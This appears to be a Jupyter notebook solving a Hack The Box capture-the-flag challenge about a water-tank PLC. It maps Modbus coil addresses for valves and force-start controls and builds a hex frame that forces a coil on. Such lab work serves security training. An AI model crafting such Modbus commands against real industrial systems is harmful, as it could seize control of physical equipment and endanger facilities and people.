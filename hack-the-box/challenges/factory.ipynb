{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Factory\n",
    "Our infrastructure is under attack!  \n",
    "The HMI interface went offline and we lost control of some critical PLCs in our ICS system.  \n",
    "Moments after the attack started we managed to identify the target but did not have time to respond.  \n",
    "The water storage facility's high/low sensors are corrupted thus setting the PLC into a halt state.  \n",
    "We need to regain control and empty the water tank before it overflows.  \n",
    "Our field operative has set a remote connection directly with the serial network of the system."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pymodbus.client import ModbusTcpClient\n",
    "\n",
    "laptop2 = (\"206.189.28.151\",30662)\n",
    "\n",
    "coils = {\n",
    "    \"in_vale\": 12,\n",
    "    \"out_valve\": 21,\n",
    "    \"start\": 33,\n",
    "    \"manual_mode_control\": 9947,\n",
    "    \"cutoff\": 5,\n",
    "    \"cutoff_in\": 26,\n",
    "    \"force_start_out\": 52,\n",
    "    \"force_start_in\": 1336\n",
    "}\n",
    "slave_id = 82\n",
    "slave_id = hex(slave_id)[2:]\n",
    "slave_id = f\"{'0'*(4-len(slave_id))}{slave_id}\" if len(slave_id) < 4 else slave_id"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5800520001000c00FF41411310\n"
     ]
    }
   ],
   "source": [
    "coil_id = hex(coils['in_vale'])[2:]\n",
    "coil_id = f\"{'0'*(4-len(coil_id))}{coil_id}\" if len(coil_id) < 4 else coil_id\n",
    "\n",
    "print(f\"58{slave_id}0001{coil_id}00FF41411310\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
